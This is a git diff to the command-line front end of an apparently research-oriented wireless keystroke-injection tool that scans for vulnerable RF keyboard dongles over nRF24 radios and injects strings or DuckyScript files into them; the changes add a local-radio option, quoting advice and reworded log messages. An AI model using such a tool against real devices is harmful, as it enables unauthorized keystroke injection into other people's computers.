@@ -4,6 +4,7 @@ from os.path import dirname
 
 sys.path.append(dirname(dirname(__file__)))
 from main_app.radio_server import *
+from radio_agent import nrf24
 from utils.general_utils import *
 
 """
@@ -34,7 +35,7 @@ def main():
     # defining arguments for "attack"
     attack_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
     group = attack_cmd.add_mutually_exclusive_group(required=True) # either a string or a script file path must be specified, but not both
-    group.add_argument("--string", type=str, help="A string of characters to be injected into the target")
+    group.add_argument("--string", type=str, help="A string of characters to be injected into the target") # if the string contains whitespaces, it must be surrounded with DOUBLE quotes
     group.add_argument("--script-file", type=str, help="Path of a DuckyScript file")
 
     # arguments for scan
@@ -45,6 +46,7 @@ def main():
 
     # initialize the radio server
     radio_server = RadioServer("0.0.0.0", 5000) # 0.0.0.0 means listen on all network interfaces, this way we don't need to change the IP in this line every time we run the server on a different computer
+    # radio_server = nrf24.nrf24() # if you want to run locally (comment out the previous line)
 
     if args.command == "attack":
         channel = find_frequency_channel(radio_server, address_str_to_bytes(args.address))
@@ -53,10 +55,10 @@ def main():
             sys.exit(1)
 
         if args.string:
-            print(f"Injecting the string: {args.string} into target address: {args.address}")
+            print(f"Injecting the string: \"{args.string}\" into the target dongle paired to the device with address: {args.address}")
             transmit_string(radio_server, args.string)
         elif args.script_file:
-            print(f"Injecting the DuckyScript at: {args.script_file} into target address: {args.address}")
+            print(f"Injecting the DuckyScript at: {args.script_file} into the target dongle paired to the device with address: {args.address}")
             
     elif args.command == "scan":
         print(f"Scanning for {args.duration} seconds...")
